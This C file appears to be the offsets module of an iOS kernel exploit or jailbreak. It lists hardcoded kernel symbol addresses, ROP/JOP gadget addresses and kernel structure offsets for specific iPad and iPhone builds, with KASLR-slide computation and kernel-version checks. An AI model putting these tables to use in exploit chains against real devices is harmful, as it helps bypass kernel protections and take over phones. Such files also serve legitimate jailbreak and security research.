#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <sys/sysctl.h>
#include <stdbool.h>

#include "offsets.h"
#include "device_info.h"

bool g_Is_iPad7_150 = false;
bool g_Is_iPad7_137 = false;
bool g_Is_iPhone6s_140 = false;

extern uint64_t gKernelBase, gKernelSlide;

uint64_t *gadgets = NULL;
uint64_t *symbols = NULL;
uint64_t kaslr_slide = 0;

/* iOS 15.0 / iPad7,11 */
uint64_t ksymbols_ipad_7_19a346[] = {
    0xFFFFFFF0071362B0, // KSYMBOL_KERNPROC
    0xFFFFFFF005B54B60, // KSYMBOL_RET_300
    0xFFFFFFF0071C6074, // KSYMBOL_KFREE
    0xFFFFFFF007807C68, // KSYMBOL_PANIC
    0xFFFFFFF0071C59E8, // KSYMBOL_KALLOC_EXT
    0xFFFFFFF0070FB350, // KHEAP_DATA_BUFFERS
    0xFFFFFFF0070FAD58, // KHEAP_DEFAULT
    0xFFFFFFF0070FB828, // KHEAP_KEXT
    0xFFFFFFF00782B500, // necp_client_add_site
    0xFFFFFFF007729F10, // KSYMBOL_IOMalloc
    0xFFFFFFF007729FCC, // KSYMBOL_IOFree
    0xFFFFFFF007841C60, // __ZZ17IOMalloc_internalE4site
    0xFFFFFFF00783A340, // pipespace_site
    0xFFFFFFF0071C60A4, // KSYMBOL_kfree_ext
    0xFFFFFFF007103638, // KSYMBOL_KERNEL_PMAP
    0xFFFFFFF007188A50, // KSYMBOL_MMU_KVTOP
    0xFFFFFFF0072C18A0, // KSYMBOL_PMAP_VTOPHYS
    0xFFFFFFF0072D3084, // KSYMBOL_PHYSTOKV
    0xFFFFFFF0072D6ABC, // KSYMBOL_ml_phys_read_data
    0xFFFFFFF007124160, // KSYMBOL_ptov_table
    0xFFFFFFF007103B20, // KSYMBOL_gPhysBase
    0xFFFFFFF007103B28, // KSYMBOL_gVirtBase
    0xFFFFFFF007103658, // KSYMBOL_cpu_ttep
    0xFFFFFFF0072C5EDC, // KSYMBOL_pmap_find_pa
    0xFFFFFFF0072C602C, // KSYMBOL_pmap_find_phys
};

/* iOS 15.0 / iPad7,11 */
uint64_t kgadgets_ipad_7_19a346[] = {
    0xFFFFFFF005B1F640, // KGADGET_POPULATE
    0xFFFFFFF006442458, // KGADGET_PROLOGUE
    0xFFFFFFF0059ACAC0, // KGADGET_ADD_X0_X0_0X40__RET
    0xFFFFFFF00625587C, // KGADGET_MOV_X5_X6__BR_X15
    0xFFFFFFF0062BB564, // KGADGET_MOV_X6_X9__BR_X11
    0xFFFFFFF0061D6514, // KGADGET_MOV_X7_X14__BR_X15
    0xFFFFFFF00624452C, // KGADGET_MOV_X9_X1__BR_X10
    0xFFFFFFF00620D7E8, // KGADGET_MOV_X15_X2__BR_X3
    0xFFFFFFF0061B933C, // KGADGET_MOV_X15_X1__BR_X2
    0xFFFFFFF0061FCB98, // KGADGET_MOV_X14_X3__BR_X4
    0xFFFFFFF0062E20E0, // KGADGET_MOV_X11_X4__BR_X2
    0xFFFFFFF0062E1264, // KGADGET_MOV_X10_X1__BR_X3
    0, // KGADGET_MOV_X10_X1__BR_X2
    0, // KGADGET_MOV_X20_X3__BR_X2     
    0, // KGADGET_MOV_X13_X1__BR_X2     
    0, // KGADGET_MOV_X11_X13__BR_X10   
    0, // KGADGET_MOV_X7_X1__BR_X8
    0, // KGADGET_MOV_X0_X3__BR_X4
    0, // KGADGET_MOV_X5_X8__BR_X10
    0, // KGADGET_MOV_X0_X20__BR_X11   
    0, // KGADGET_MOV_X12_X0__BR_X2
    0, // KGADGET_MOV_X0_X1__BR_X2
    0, // KGADGET_MOV_X20_X15__BR_X12
    0, // KGADGET_MOV_X11_X1__BR_X12
    0, // KGADGET_MOV_X16_X1__BR_X2
    0, // KGADGET_MOV_X10_X12__BR_X8
    0, // KGADGET_MOV_X7_X16__BR_X10
    0, // KGADGET_MOV_X10_X0__BR_X2
    
};

/* iOS 13.7 / iPad7,11 */
uint64_t ksymbols_ipad_7_17h35[] = {
    0xFFFFFFF0077702A0, // KSYMBOL_KERNPROC
    0xFFFFFFF00612EB70, // KSYMBOL_RET_300
    0, // KSYMBOL_KFREE
    0, // KSYMBOL_PANIC
    0, // KSYMBOL_KALLOC_EXT
    0, // KHEAP_DATA_BUFFERS
    0, // KHEAP_DEFAULT
    0, // KHEAP_KEXT
    0, // necp_client_add_site
    0, // KSYMBOL_IOMalloc
    0, // KSYMBOL_IOFree
    0, // __ZZ17IOMalloc_internalE4site
    0, // pipespace_site
    0, // KSYMBOL_kfree_ext
    0xFFFFFFF0070D1B10, // KSYMBOL_KERNEL_PMAP
    0xFFFFFFF007104A98, // KSYMBOL_MMU_KVTOP
    0xFFFFFFF0072277C8, // KSYMBOL_PMAP_VTOPHYS
    0, // KSYMBOL_PHYSTOKV
    0xFFFFFFF0072320FC, // KSYMBOL_ml_phys_read_data
    0, // KSYMBOL_ptov_table
    0, // KSYMBOL_gPhysBase
    0, // KSYMBOL_gVirtBase
    0, // KSYMBOL_cpu_ttep
    0, // KSYMBOL_pmap_find_pa // NOT EXISTS on iOS 13.7
    0xFFFFFFF0072277C8, // KSYMBOL_pmap_find_phys
};

/* iOS 13.7 / iPad7,11 */
uint64_t kgadgets_ipad_7_17h35[] = {
    0xFFFFFFF006019AFC, // KGADGET_POPULATE
    0xFFFFFFF006747A44, // KGADGET_PROLOGUE
    0xFFFFFFF0074DF6F0, // KGADGET_ADD_X0_X0_0X40__RET
    0, // KGADGET_MOV_X5_X6__BR_X15
    0, // KGADGET_MOV_X6_X9__BR_X11
    0, // KGADGET_MOV_X7_X14__BR_X15
    0, // KGADGET_MOV_X9_X1__BR_X10
    0, // KGADGET_MOV_X15_X2__BR_X3
    0, // KGADGET_MOV_X15_X1__BR_X2
    0, // KGADGET_MOV_X14_X3__BR_X4
    0, // KGADGET_MOV_X11_X4__BR_X2
    0, // KGADGET_MOV_X10_X1__BR_X3
    0xFFFFFFF006628A94, // KGADGET_MOV_X10_X1__BR_X2
    0xFFFFFFF00659DCAC, // KGADGET_MOV_X20_X3__BR_X2     
    0xFFFFFFF006556E14, // KGADGET_MOV_X13_X1__BR_X2     
    0xFFFFFFF006512534, // KGADGET_MOV_X11_X13__BR_X10   
    0xFFFFFFF00654C500, // KGADGET_MOV_X7_X1__BR_X8
    0xFFFFFFF00752BA84, // KGADGET_MOV_X0_X3__BR_X4
    0xFFFFFFF006B3D428, // KGADGET_MOV_X5_X8__BR_X10
    0xFFFFFFF0072EEECC, // KGADGET_MOV_X0_X20__BR_X11   
    0, // KGADGET_MOV_X12_X0__BR_X2
    0, // KGADGET_MOV_X0_X1__BR_X2
    0, // KGADGET_MOV_X20_X15__BR_X12
    0, // KGADGET_MOV_X11_X1__BR_X12
    0, // KGADGET_MOV_X16_X1__BR_X2
    0, // KGADGET_MOV_X10_X12__BR_X8
    0, // KGADGET_MOV_X7_X16__BR_X10
    0, // KGADGET_MOV_X10_X0__BR_X2
};

/* iOS 14.0 / iPhone8,1 */
uint64_t ksymbols_iphone_6s_18a373[] = {
    0xFFFFFFF0070D01B8, // KSYMBOL_KERNPROC
    0xFFFFFFF005FDB230, // KSYMBOL_RET_300
    0, // KSYMBOL_KFREE
    0, // KSYMBOL_PANIC
    0, // KSYMBOL_KALLOC_EXT
    0, // KHEAP_DATA_BUFFERS
    0, // KHEAP_DEFAULT
    0, // KHEAP_KEXT
    0, // necp_client_add_site
    0, // KSYMBOL_IOMalloc
    0, // KSYMBOL_IOFree
    0, // __ZZ17IOMalloc_internalE4site
    0, // pipespace_site
    0, // KSYMBOL_kfree_ext
    0xFFFFFFF0070AB9A8, // KSYMBOL_KERNEL_PMAP
    0xFFFFFFF0070FF918, // KSYMBOL_MMU_KVTOP
    0xFFFFFFF00722ACB0, // KSYMBOL_PMAP_VTOPHYS
    0xFFFFFFF007237814, // KSYMBOL_PHYSTOKV
    0xFFFFFFF00723A58C, // KSYMBOL_ml_phys_read_data
    0, // KSYMBOL_ptov_table
    0xFFFFFFF0070ABDA0, // KSYMBOL_gPhysBase
    0xFFFFFFF0070ABDA8, // KSYMBOL_gVirtBase
    0, // KSYMBOL_cpu_ttep
    0xFFFFFFF00722EB5C, // KSYMBOL_pmap_find_pa
    0xFFFFFFF00722EC9C, // KSYMBOL_pmap_find_phys
};

/* iOS 14.0 / iPhone8,1 */
uint64_t kgadgets_iphone_6s_18a373[] = {
    0xFFFFFFF006805B44, // KGADGET_POPULATE
    0xFFFFFFF0066DCA84, // KGADGET_PROLOGUE
    0xFFFFFFF0060412B8, // KGADGET_ADD_X0_X0_0X40__RET
    0, // KGADGET_MOV_X5_X6__BR_X15
    0, // KGADGET_MOV_X6_X9__BR_X11
    0, // KGADGET_MOV_X7_X14__BR_X15
    0, // KGADGET_MOV_X9_X1__BR_X10
    0xFFFFFFF006544BA4, // KGADGET_MOV_X15_X2__BR_X3
    0, // KGADGET_MOV_X15_X1__BR_X2
    0, // KGADGET_MOV_X14_X3__BR_X4
    0, // KGADGET_MOV_X11_X4__BR_X2
    0, // KGADGET_MOV_X10_X1__BR_X3
    0, // KGADGET_MOV_X10_X1__BR_X2
    0, // KGADGET_MOV_X20_X3__BR_X2     
    0, // KGADGET_MOV_X13_X1__BR_X2     
    0, // KGADGET_MOV_X11_X13__BR_X10   
    0, // KGADGET_MOV_X7_X1__BR_X8
    0xFFFFFFF0074DF178, // KGADGET_MOV_X0_X3__BR_X4
    0xFFFFFFF006AD1608, // KGADGET_MOV_X5_X8__BR_X10
    0xFFFFFFF0072FF92C, // KGADGET_MOV_X0_X20__BR_X11   
    0xFFFFFFF0064D26F8, // KGADGET_MOV_X12_X0__BR_X2
    0xFFFFFFF007235050, // KGADGET_MOV_X0_X1__BR_X2
    0xFFFFFFF006561048, // KGADGET_MOV_X20_X15__BR_X12
    0xFFFFFFF00665B4EC, // KGADGET_MOV_X11_X1__BR_X12
    0xFFFFFFF006599430, // KGADGET_MOV_X16_X1__BR_X2
    0xFFFFFFF006562880, // KGADGET_MOV_X10_X12__BR_X8
    0xFFFFFFF006589788, // KGADGET_MOV_X7_X16__BR_X10
    0xFFFFFFF0065A0BB8, // KGADGET_MOV_X10_X0__BR_X2
};

uint64_t ksym(enum ksymbol sym)
{

    return symbols[sym] + gKernelSlide;
}

uint64_t kgad(enum kgadget gad)
{
    kaslr_slide = gKernelBase - 0xFFFFFFF007004000;

    return gadgets[gad] + kaslr_slide;
}


uint32_t off_p_pid = 0;
uint32_t off_p_pfd = 0;
uint32_t off_p_list_le_prev = 0;
uint32_t off_p_task = 0;
uint32_t off_task_itk_space = 0;
uint32_t off_fd_ofiles = 0;
uint32_t off_fp_fglob = 0;
uint32_t off_fg_data = 0;
uint32_t off_pb_buffer = 0;
uint32_t off_ipc_space_is_table = 0;
uint32_t off_ipc_space_is_task = 0;
uint32_t off_ipc_port_ip_receiver = 0;
uint32_t off_ipc_port_ip_kobject = 0;
uint32_t off_ipc_port_ikmq_base = 0;
uint32_t off_ipc_kmsg_ikm_header = 0;
uint32_t off_ipc_kmsg_ikm_data = 0;
uint32_t off_mach_msg_header_t_msgh_remote_port = 0;
uint32_t off_task_map = 0;
uint32_t off_vm_map_pmap = 0;
uint32_t off_pmap_ttep = 0;
uint32_t off_pmap_min = 0;
uint32_t off_pmap_max = 0;
uint32_t off_socket_so_pcb = 0;


void offsets_init(void) {
    char kern_version[512] = {};
    size_t size = sizeof(kern_version);
    sysctlbyname("kern.version", &kern_version, &size, NULL, 0);

    struct DeviceInfo info = get_device_info();
    printf("Model: %s\n", info.model);
    printf("Version: %s\n", info.version);

    if(strcmp(info.model, "iPad7,11") == 0 && strcmp(info.version, "13.7") == 0) {
        g_Is_iPad7_137 = true;
    }
    if(strcmp(info.model, "iPad7,11") == 0 && strcmp(info.version, "15.0") == 0) {
        g_Is_iPad7_150 = true;
    }
    if(strcmp(info.model, "iPhone8,1") == 0 && strcmp(info.version, "14.0") == 0) {
        g_Is_iPhone6s_140 = true;
    }

    if (strcmp(kern_version, T8010_19A346_KVERSION) != 0
        && strcmp(kern_version, T8010_17H35_KVERSION) != 0
        && strcmp(kern_version, S8000_18A373_KVERSION) != 0) {
        printf("[-] Your Kernel is NOT supported.\n");
        exit(EXIT_FAILURE);
    }

    if (strcmp(kern_version, T8010_19A346_KVERSION) == 0) {
        off_p_pid = 0x68;
        off_p_pfd = 0xe0;    //p/x offsetof(proc, p_fd)
        off_p_list_le_prev = 0x8;
        
        off_p_task = 0x10;
        
        off_fd_ofiles = 0x20;

        off_fp_fglob = 0x10;

        off_fg_data = 0x38;     //p/x offsetof(fileglob, fg_data)

        off_pb_buffer = 0x10;   //p/x offsetof(struct pipe, pipe_buffer.buffer)
        
        off_task_itk_space = 0x330;
        off_ipc_space_is_table = 0x20;
        off_ipc_space_is_task = 0x30;
        
        off_ipc_port_ip_receiver = 0x50;
        off_ipc_port_ip_kobject = 0x58;
        off_ipc_port_ikmq_base = 0x30;
        
        off_ipc_kmsg_ikm_header = 0x18;
        off_ipc_kmsg_ikm_data = 0x10;
        
        off_mach_msg_header_t_msgh_remote_port = 0x8;

        off_task_map = 0x28;

        off_vm_map_pmap = 0x48;

        off_pmap_ttep = 0x8;
        
        gadgets = kgadgets_ipad_7_19a346;
        symbols = ksymbols_ipad_7_19a346;
    }
    else if(strcmp(kern_version, T8010_17H35_KVERSION) == 0) {
        off_p_pid = 0x68; //v
        off_p_list_le_prev = 0x8;
        
        off_p_task = 0x10; //v

        off_fg_data = 0x38;     //p/x offsetof(fileglob, fg_data)

        off_socket_so_pcb = 0x10;
        
        off_task_itk_space = 0x320; //v
        off_ipc_space_is_table = 0x20;  //v
        off_ipc_space_is_task = 0x28; //v

        off_ipc_port_ip_kobject = 0x68; //v

        off_task_map = 0x28;

        off_vm_map_pmap = 0x48;

        
        gadgets = kgadgets_ipad_7_17h35;
        symbols = ksymbols_ipad_7_17h35;
    }
    else if(strcmp(kern_version, S8000_18A373_KVERSION) == 0) {
        off_p_pid = 0x68; //v
        off_p_list_le_prev = 0x8;
        
        off_p_task = 0x10; //v
        
        off_task_itk_space = 0x330; //v
        off_ipc_space_is_table = 0x20;  //v
        off_ipc_space_is_task = 0x28; //v

        off_ipc_port_ip_kobject = 0x68; //v

        off_task_map = 0x28;

        off_vm_map_pmap = 0x48;

        off_pmap_min = 0x10;
        off_pmap_max = 0x18;

        off_fg_data = 0x38;

        off_socket_so_pcb = 0x10;
        
        gadgets = kgadgets_iphone_6s_18a373;
        symbols = ksymbols_iphone_6s_18a373;
    }
}